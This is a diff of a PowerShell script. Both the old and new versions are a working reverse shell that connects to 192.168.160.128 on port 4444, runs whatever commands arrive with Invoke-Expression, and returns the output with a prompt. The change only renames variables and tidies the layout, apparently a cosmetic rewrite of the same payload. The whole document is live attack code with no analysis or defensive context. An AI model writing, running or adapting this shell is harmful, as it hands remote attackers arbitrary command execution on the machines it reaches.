@@ -1,15 +1,17 @@
-$ip = "192.168.160.128"; $port = 4444;
-$c = New-Object System.Net.Sockets.TCPClient($ip, $port);
-$s = $c.GetStream();
-[byte[]]$b = 0..65535 | %{0};
-while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
-$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
-$sb = (iex $d 2>&1 | Out-String);
-$sb2 = $sb + "PS " + (pwd).Path + "> ";
-$sbbyte = ([text.encoding]::ASCII).GetBytes($sb2);
-$s.Write($sbbyte, 0, $sbbyte.Length);
-$s.Flush();
+$k = "192.168.160.128"; $p = 4444;
+$client = New-Object Net.Sockets.TCPClient($k, $p);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535 | %{0};
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $cmd = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i);
+    $output = (Invoke-Expression $cmd 2>&1 | Out-String);
+    $prompt = $output + "PS " + (Get-Location).Path + "> ";
+    $response = [Text.Encoding]::ASCII.GetBytes($prompt);
+    $stream.Write($response, 0, $response.Length);
+    $stream.Flush();
 }
-$c.Close();
+$client.Close();
+
+
 
 
